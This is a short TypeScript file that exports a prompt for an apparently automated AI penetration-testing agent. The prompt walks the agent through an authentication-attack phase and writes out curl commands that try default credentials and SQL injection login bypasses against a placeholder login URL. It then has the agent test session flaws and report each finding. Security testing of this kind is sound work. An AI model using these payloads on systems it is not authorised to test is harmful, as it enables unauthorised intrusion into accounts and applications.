export const AUTH_PHASE_PROMPT = `## Phase: Authentication Attacks

**You MUST attempt to BREAK authentication. Do NOT just observe.**

### ATTACK SEQUENCE:
1. **Default credentials on login form:**
   \`\`\`
   curl -s -X POST "LOGIN_URL" -d "username=admin&password=admin"
   curl -s -X POST "LOGIN_URL" -d "username=admin&password=password"
   curl -s -X POST "LOGIN_URL" -d "username=guest&password=guest"
   \`\`\`

2. **SQLi bypass on login:**
   \`\`\`
   curl -s -X POST "LOGIN_URL" -d "username=admin' OR '1'='1' --&password=x"
   curl -s -X POST "LOGIN_URL" -d "username=admin'--&password=x"
   \`\`\`

3. **If login bypass works → IMMEDIATELY call report_finding**, then test session manipulation.

4. **Session attacks:** Check cookie flags (HttpOnly, Secure), test session fixation, test token reuse.

### REPORT IMMEDIATELY
Every successful bypass or session flaw → call report_finding with the exact curl command + response as POC.

### AFTER AUTH
Call update_pentest_phase with checklist.auth_session=true. Proceed to access_control.`;
